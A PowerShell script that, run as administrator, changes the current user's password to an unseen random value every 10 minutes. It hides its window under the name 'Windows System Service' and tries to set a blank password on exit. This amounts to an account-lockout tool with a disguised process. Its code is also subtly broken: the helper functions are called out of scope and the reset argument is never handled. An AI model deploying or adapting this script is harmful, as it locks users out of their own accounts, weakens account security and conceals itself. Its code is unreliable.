# Password.ps1 – Fully self-contained, no tasks needed
# Run once as Administrator → stays alive forever and does everything

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")) {
    Write-Warning "Run as Administrator!"
    exit 1
}

$scriptPath = "$env:ProgramData\PasswordTasks.ps1"

# Create the helper functions once
@'
function Generate-RandomPassword {
    $all = [char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
    ($all | Get-Random -Count 16) -join ''
}
function Set-NewRandomPassword {
    $new = Generate-RandomPassword
    Set-LocalUser -Name $env:USERNAME -Password (ConvertTo-SecureString $new -AsPlainText -Force)
}
function Reset-ToBlank {
    Set-LocalUser -Name $env:USERNAME -Password (ConvertTo-SecureString "" -AsPlainText -Force)
}
'@ | Set-Content -Path $scriptPath -Force

# Immediate random password
& $scriptPath; Set-NewRandomPassword

# Hide this PowerShell window completely
$null = $host.UI.RawUI.WindowTitle = "Windows System Service"
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$console = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($console, 0) | Out-Null

# Register shutdown script (runs even if user logs off)
$shutdownScript = {
    powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$using:scriptPath" "Reset-ToBlank"
}
$shutdownJob = Register-EngineEvent -SourceIdentifier PowerShell.OnLogoff -Action $shutdownScript -SupportEvent
$shutdownJob2 = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action $shutdownScript -SupportEvent

Write-Host "Password.ps1 is now running forever in background`n→ New random password every 10 minutes`n→ Blank password on shutdown/restart" -ForegroundColor Green
Start-Sleep -Seconds 5
Clear-Host

# Main infinite loop – changes password every 10 minutes
while ($true) {
    Start-Sleep -Seconds (10 * 60)   # 10 minutes
    try {
        & $scriptPath; Set-NewRandomPassword 2>$null
    } catch { }
}